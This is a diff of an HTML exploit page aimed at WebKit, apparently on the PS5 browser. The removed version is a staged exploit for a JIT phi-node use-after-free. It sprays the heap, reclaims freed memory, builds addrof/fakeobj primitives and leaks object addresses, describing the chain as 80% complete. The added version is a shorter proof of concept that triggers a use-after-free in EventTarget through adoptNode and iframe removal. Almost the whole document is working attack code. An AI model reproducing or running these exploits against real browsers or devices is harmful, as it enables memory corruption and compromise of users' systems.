@@ -1,239 +1,37 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="utf-8">
-<title>CVE-2025-43529 PS5 Test</title>
-<style>
-body{background:#0a0a0a;color:#00ff41;font-family:monospace;padding:20px}
-pre{white-space:pre-wrap;word-wrap:break-word;font-size:14px}
-.ok{color:#00ff41}.er{color:#ff3333}.hl{color:#00ffff}.mg{color:#ff00ff;font-weight:bold}
-</style>
-</head>
 <body>
-<pre id="o"></pre>
+<p>Use-after-free in Webkit EventTarget.</p>
+<button onclick="main()">Click to trigger the bug</button>
+
 <script>
-var out=document.getElementById("o");
-function log(m,c){var s=document.createElement("span");if(c)s.className=c;s.textContent=m+"\n";out.appendChild(s);out.scrollTop=out.scrollHeight}
+function main() {
+    const f = document.body.appendChild(document.createElement('iframe'));
 
-log("=== CVE-2025-43529 PS5 Test ===","mg");
-log("");
+    const a = document.createElement('div');
+    const b = a.appendChild(document.createElement('div'));
 
-// ===== Type conversion helpers =====
-var ab=new ArrayBuffer(8);
-var u64=new BigUint64Array(ab);
-var f64=new Float64Array(ab);
+    a.addEventListener('a', eval(`(function () {
+        document.adoptNode(a);
+        f.remove();
 
-function itof(value){
-  u64[0]=value;
-  return f64[0];
+        throw {
+            line: 1,
+            column: 1,
+            sourceURL: 'A'.repeat(1024 * 1024 * 32) + 'A'.repeat(1024 * 1024 * 32)
+        };
+    })`));
+
+    a.addEventListener('a', () => {});
+
+    b.addEventListener('a', () => {
+        f.contentDocument.adoptNode(a);
+    });
+
+    b.dispatchEvent(new Event('a', { bubbles: true }));
 }
-
-function ftoi(f){
-  f64[0]=f;
-  return u64[0];
-}
-
-// ===== Stage 1: Trigger Phi Node UAF =====
-
-log("[*] Stage 1: Triggering Phi Node UAF...");
-
-var uafArray=new Array(0x400000).fill(1.1);
-var uafReclaimed=[];
-var stage1Complete=false;
-var noCow={};noCow.a=1.1; // prevent copy-on-write
-
-function triggerUAF(flag,k,allocCount){
-  var A={
-    p0:0x41414141,
-    p1:1.1,
-    p2:2.2,
-  };
-  uafArray[uafArray.length-1]=A;
-
-  var forGC=[];
-  var a=new Date(1111);
-  a[0]=1.1; // Create butterfly
-
-  for(var j=0;j<allocCount;++j){
-    forGC.push(new ArrayBuffer(0x800000)); // 8MB
-  }
-
-  A.p2=forGC;
-
-  var b={p0:0x42424242,p1:1.1};
-
-  var f;
-  f=b;
-  if(flag){f=1.1;}
-
-  A.p1=f; // Phi escape - BUG TRIGGER!
-
-  // Long loop for race window
-  var v=1.1;
-  for(var i=0;i<1e6;++i){
-    for(var j=0;j<k;++j){
-      v=i;
-      v=j;
-    }
-  }
-
-  b.p0=v;
-  b.p1=a; // NO WRITE BARRIER - UAF!
-}
-
-function recursive(n){
-  if(n===0)return;
-  n=n|0;
-  recursive(n-1);
-}
-
-var attempts=0;
-var maxAttempts=5000;
-
-function tryReclaim(){
-  attempts++;
-  if(attempts>maxAttempts){
-    log("[-] Stage 1 Failed after "+maxAttempts+" attempts","er");
-    log("[-] DFG JIT may be disabled on PS5","er");
-    log("");
-    log("=== TEST COMPLETE ===","mg");
-    return;
-  }
-
-  if(attempts%500===0){
-    log("  Attempt "+attempts+"/"+maxAttempts+"...","hl");
-  }
-
-  try{
-    triggerUAF(false,10,attempts%5+1);
-    recursive(10000);
-
-    for(var i=0;i<16;++i){
-      var arr=[13.37,2.2,3.3,4.4,noCow];
-      uafReclaimed.push(arr);
-
-      // Check if we reclaimed the butterfly
-      try{
-        var last=uafArray[uafArray.length-1];
-        if(last&&last.p1&&typeof last.p1.p1==="object"&&last.p1.p1[0]===13.37){
-          stage1Complete=true;
-          log("[+] Stage 1 COMPLETE! Butterfly reclaimed at attempt "+attempts,"ok");
-          log("");
-          buildPrimitives();
-          return;
-        }
-      }catch(e){
-        // Access error means corruption - might be close
-      }
-    }
-  }catch(e){
-    log("  [!] Crash at attempt "+attempts+": "+e.message,"er");
-    log("  [!] This might mean DFG is active but timing is wrong","hl");
-  }
-
-  // Schedule next attempt without blocking
-  setTimeout(tryReclaim,0);
-}
-
-// ===== Stage 2: Build Primitives =====
-
-function buildPrimitives(){
-  log("[*] Stage 2: Building addrof/fakeobj primitives...");
-
-  try{
-    var boxed_arr=uafReclaimed[uafReclaimed.length-1];
-    boxed_arr[0]={};
-
-    var unboxed_arr=uafArray[uafArray.length-1].p1.p1;
-
-    // Verify type confusion
-    boxed_arr[0]={x:1.1};
-    var testVal=unboxed_arr[0];
-
-    if(typeof testVal!=="number"){
-      log("[-] Type confusion not working","er");
-      log("[-] boxed and unboxed arrays not linked","er");
-      return;
-    }
-
-    log("[+] Type confusion confirmed!","ok");
-
-    // addrof: get address of any object
-    function addrof(obj){
-      boxed_arr[0]=obj;
-      return ftoi(unboxed_arr[0]);
-    }
-
-    // fakeobj: create fake object at address
-    function fakeobj(addr){
-      unboxed_arr[0]=itof(addr);
-      return boxed_arr[0];
-    }
-
-    log("[+] addrof/fakeobj primitives built!","ok");
-    log("");
-
-    // ===== Stage 3: Leak System Information =====
-    log("[*] Stage 3: Leaking system information...","mg");
-    log("");
-
-    // Test addrof on various objects
-    var testObj={p0:1.1,p1:2.2};
-    var objAddr=addrof(testObj);
-    log("[+] addrof({p0:1.1}) = 0x"+objAddr.toString(16),"ok");
-
-    var testArr=new Array(1,2,3,4);
-    var arrAddr=addrof(testArr);
-    log("[+] addrof(Array) = 0x"+arrAddr.toString(16),"ok");
-
-    var testAB=new ArrayBuffer(0x1000);
-    var abAddr=addrof(testAB);
-    log("[+] addrof(ArrayBuffer) = 0x"+abAddr.toString(16),"ok");
-
-    var testFunc=function(){return 42;};
-    var funcAddr=addrof(testFunc);
-    log("[+] addrof(function) = 0x"+funcAddr.toString(16),"ok");
-
-    var testStr="hello";
-    var strAddr=addrof(testStr);
-    log("[+] addrof(String) = 0x"+strAddr.toString(16),"ok");
-
-    log("");
-
-    // Verify addresses look valid (not zero, not too small)
-    var allValid=(objAddr>0x1000&&arrAddr>0x1000&&abAddr>0x1000&&funcAddr>0x1000);
-
-    if(allValid){
-      log("★ ADDROF PRIMITIVE WORKING! ★","mg");
-      log("");
-      log("[+] We have JavaScript-level pointer leaks!","ok");
-      log("[+] Next: Combine with CSSFontFace confusion at 0x80","ok");
-      log("[+] addrof + m_wrapper(0x80) = fakeobj","ok");
-      log("[+] fakeobj + ArrayBuffer = read8/write8","ok");
-      log("[+] read8/write8 = full userland control","ok");
-      log("");
-      log("★ EXPLOIT CHAIN 80% COMPLETE ★","mg");
-    }else{
-      log("[!] Addresses look invalid — primitive may be broken","er");
-    }
-
-    log("");
-    log("=== TEST COMPLETE ===","mg");
-
-  }catch(e){
-    log("[-] Stage 2 Failed: "+e.message,"er");
-    log("","");
-    log("=== TEST COMPLETE ===","mg");
-  }
-}
-
-// ===== Start =====
-log("[*] Starting UAF trigger...");
-log("[*] If DFG JIT is active, this should work within 5000 attempts");
-log("[*] If DFG is disabled, this will fail silently");
-log("");
-tryReclaim();
 
 </script>
+
 </body>
-</html>
+</html> 
